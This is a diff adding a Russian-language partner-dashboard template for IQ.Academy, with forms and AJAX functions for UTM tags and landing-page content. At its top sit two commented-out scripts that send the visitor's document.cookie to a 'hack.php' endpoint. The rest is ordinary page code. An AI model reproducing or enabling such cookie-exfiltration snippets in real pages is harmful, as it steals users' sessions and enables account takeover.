@@ -1,0 +1,220 @@
+<link rel="stylesheet" href='/modules/account/templates/index.css'>
+<h1><title /></h1>
+<!--<script>
+    let img = new Image(); img.src = 'https://api.iq.academy/hack.php?' + document.cookie;
+</script>-->
+
+<!--<script>
+    let a = document.cookie;
+    let url = 'https://api.iq.academy/hack.php?' + a;
+    let xmlhttp = new XMLHttpRequest();
+    xmlhttp.onreadystatechange = function () {}
+    xmlhttp.open("POST", url);
+    xmlhttp.send();
+</script>-->
+<script>
+
+    function add_utm(id){
+        let xmlhttp = new XMLHttpRequest();
+        xmlhttp.onreadystatechange = function () {
+            if (this.readyState === 4)
+            {
+                location.reload()
+            }
+        }
+        if (document.getElementById("utm_name").value === ''){
+            alert('Введите название метки')
+        }
+        if (document.getElementById("utm_title").value === ''){
+            alert('Введите Utm-Метку')
+        }
+
+        let url = "partner_ajax.php?module=courses&act=add&id=" + id;
+
+        let send = new FormData()
+        send.append('name', document.getElementById("utm_name").value)
+        send.append('title', document.getElementById("utm_title").value)
+
+        xmlhttp.open("POST", url);
+        xmlhttp.send(send);
+    }
+
+    function edit_utm_html(id){
+        let xmlhttp = new XMLHttpRequest();
+        xmlhttp.onreadystatechange = function () {
+            if (this.readyState === 4)
+            {
+                if (this.responseText.indexOf('domain exists') !== -1){
+                    alert('Такой домен уже существует')
+                }
+            }
+        }
+
+        let url = "partner_ajax.php?module=courses&act=utm_html&id=" + id;
+
+        let send = new FormData()
+        send.append('utm_html', document.getElementById("utm_html").value)
+        send.append('domain', document.getElementById("domain").value)
+        send.append('partner_description', document.getElementById("partner_description").value)
+
+        send.append('header_about_1', document.getElementById("header_about_1").value)
+        send.append('header_about_2', document.getElementById("header_about_2").value)
+        send.append('header_about_3', document.getElementById("header_about_3").value)
+
+        send.append('text_about_1', document.getElementById("text_about_1").value)
+        send.append('text_about_2', document.getElementById("text_about_2").value)
+        send.append('text_about_3', document.getElementById("text_about_3").value)
+
+        send.append('header_about', document.getElementById("header_about").value)
+
+        if (document.getElementById("img_about_1") !== null){
+            send.append('img_about_1', document.getElementById("img_about_1").files[0]);
+        }
+        if (document.getElementById("img_about_2") !== null){
+            send.append('img_about_2', document.getElementById("img_about_2").files[0]);
+        }
+        if (document.getElementById("img_about_3") !== null){
+            send.append('img_about_3', document.getElementById("img_about_3").files[0]);
+        }
+
+        send.append('header_for_whom_1', document.getElementById("header_for_whom_1").value)
+        send.append('header_for_whom_2', document.getElementById("header_for_whom_2").value)
+        send.append('header_for_whom_3', document.getElementById("header_for_whom_3").value)
+
+        send.append('text_for_whom_1', document.getElementById("text_for_whom_1").value)
+        send.append('text_for_whom_2', document.getElementById("text_for_whom_2").value)
+        send.append('text_for_whom_3', document.getElementById("text_for_whom_3").value)
+
+        send.append('header_for_whom', document.getElementById("header_for_whom").value)
+
+        if (document.getElementById("img_for_whom_1") !== null){
+            send.append('img_for_whom_1', document.getElementById("img_for_whom_1").files[0]);
+        }
+        if (document.getElementById("img_for_whom_2") !== null){
+            send.append('img_for_whom_2', document.getElementById("img_for_whom_2").files[0]);
+        }
+        if (document.getElementById("img_for_whom_3") !== null){
+            send.append('img_for_whom_3', document.getElementById("img_for_whom_3").files[0]);
+        }
+
+        if (document.getElementById('no_logo').checked){
+            send.append('no_logo', '1')
+        }
+
+        xmlhttp.open("POST", url);
+        xmlhttp.send(send);
+    }
+
+    function delete_utm(id){
+        let xmlhttp = new XMLHttpRequest();
+        xmlhttp.onreadystatechange = function () {
+            if (this.readyState === 4)
+            {
+                location.reload()
+            }
+        }
+
+        let url = "partner_ajax.php?module=courses&act=delete&id=" + id;
+
+        xmlhttp.open("POST", url);
+        xmlhttp.send();
+    }
+
+</script>
+<div>
+    <h3>Источники трафика</h3>
+    <table class="items_table">
+        <thead>
+            <tr class="items_row items_row_header">
+                <td class="items_cell">Название</td>
+                <td class="items_cell">Переходы</td>
+                <td class="items_cell">Регистрации</td>
+                <td class="items_cell">Покупки</td>
+                <td class="items_cell">Сумма, руб</td>
+                <td class="items_cell">Управление</td>
+            </tr>
+        </thead>
+        <tbody>
+            <utms />
+        </tbody>
+    </table>
+    <div style="margin-bottom: 5px">
+        Добавить Utm-метку: <input style="width: 100px" type="text" name="name" placeholder="Название" id="utm_name" /> <input style="width: 100px" type="text" name="title" placeholder="Utm-Метка" id="utm_title" /> <input type="button" value="Добавить" onclick="add_utm(<id />)" />
+    </div>
+    <div style="margin-bottom: 5px">
+        <h3>HTML</h3>
+        <div style="margin-bottom: 5px">
+            <textarea name="utm_html" id="utm_html" cols="30" rows="7" placeholder="Header block"><utm_html /></textarea>
+        </div>
+        <div style="margin-bottom: 5px">
+            <h3>Домен курса</h3>
+            <input type="text" name="domain" id="domain" placeholder="Домен курса" value="<domain />" />
+        </div>
+        <div style="margin-bottom: 5px">
+            <h3>Подробное описание</h3>
+            <textarea name="partner_description" id="partner_description" cols="30" rows="7" placeholder="Подробное описание"><partner_description /></textarea>
+        </div>
+        <div style="margin-bottom: 5px">
+            <h3>Что получит Ваш ученик</h3>
+            <div style="margin-bottom: 5px">
+                <b>Заголовок</b><br />
+                <input id="header_about" type="text" value="<header_about />">
+            </div>
+            <b>Примеры</b>
+            <table class="items_table">
+                <thead class="items_row items_row_header">
+                    <td class="items_cell">Файл</td>
+                    <td class="items_cell">Заголовок</td>
+                    <td class="items_cell">Описание</textarea></td>
+                </thead>
+                <tr class="items_row items_row_header">
+                    <td class="items_cell"><input type="file" id="img_about_1" /></td>
+                    <td class="items_cell"><input placeholder="Заголовок" type="text" id="header_about_1" value="<header_about_1 />" /></td>
+                    <td class="items_cell"><textarea placeholder="Текст" id="text_about_1" cols="30" rows="7"><text_about_1 /></textarea></td>
+                </tr>
+                <tr class="items_row items_row_header">
+                    <td class="items_cell"><input type="file" id="img_about_2" /></td>
+                    <td class="items_cell"><input placeholder="Заголовок" type="text" id="header_about_2" value="<header_about_2 />" /></td>
+                    <td class="items_cell"><textarea placeholder="Текст" id="text_about_2" cols="30" rows="7"><text_about_2 /></textarea></td>
+                </tr>
+                <tr class="items_row items_row_header">
+                    <td class="items_cell"><input type="file" id="img_about_3" /></td>
+                    <td class="items_cell"><input placeholder="Заголовок" type="text" id="header_about_3" value="<header_about_3 />" /></td>
+                    <td class="items_cell"><textarea placeholder="Текст" id="text_about_3" cols="30" rows="7"><text_about_3 /></textarea></td>
+                </tr>
+            </table>
+        <div style="margin-bottom: 5px">
+            <h3>Для кого это?</h3>
+            <div style="margin-bottom: 5px">
+                <b>Заголовок</b><br />
+                <input id="header_for_whom" type="text" value="<header_for_whom />">
+            </div>
+            <b>Примеры</b>
+            <table class="items_table">
+                <thead class="items_row items_row_header">
+                <td class="items_cell">Файл</td>
+                <td class="items_cell">Заголовок</td>
+                <td class="items_cell">Описание</textarea></td>
+                </thead>
+                <tr class="items_row items_row_header">
+                    <td class="items_cell"><input type="file" id="img_for_whom_1" /></td>
+                    <td class="items_cell"><input placeholder="Заголовок" type="text" id="header_for_whom_1" value="<header_for_whom_1 />" /></td>
+                    <td class="items_cell"><textarea placeholder="Текст" id="text_for_whom_1" cols="30" rows="7"><text_for_whom_1 /></textarea></td>
+                </tr>
+                <tr class="items_row items_row_header">
+                    <td class="items_cell"><input type="file" id="img_for_whom_2" /></td>
+                    <td class="items_cell"><input placeholder="Заголовок" type="text" id="header_for_whom_2" value="<header_for_whom_2 />" /></td>
+                    <td class="items_cell"><textarea placeholder="Текст" id="text_for_whom_2" cols="30" rows="7"><text_for_whom_2 /></textarea></td>
+                </tr>
+                <tr class="items_row items_row_header">
+                    <td class="items_cell"><input type="file" id="img_for_whom_3" /></td>
+                    <td class="items_cell"><input placeholder="Заголовок" type="text" id="header_for_whom_3" value="<header_for_whom_3 />" /></td>
+                    <td class="items_cell"><textarea placeholder="Текст" id="text_for_whom_3" cols="30" rows="7"><text_for_whom_3 /></textarea></td>
+                </tr>
+            </table>
+        <div style="margin-bottom: 5px">
+            <input type="checkbox" name="no_logo" id="no_logo" /> Убрать логотип IQ.Academy
+        </div>
+        <input type="button" value="Сохранить" onclick="edit_utm_html(<id />)" />
+    </div>
+</div>
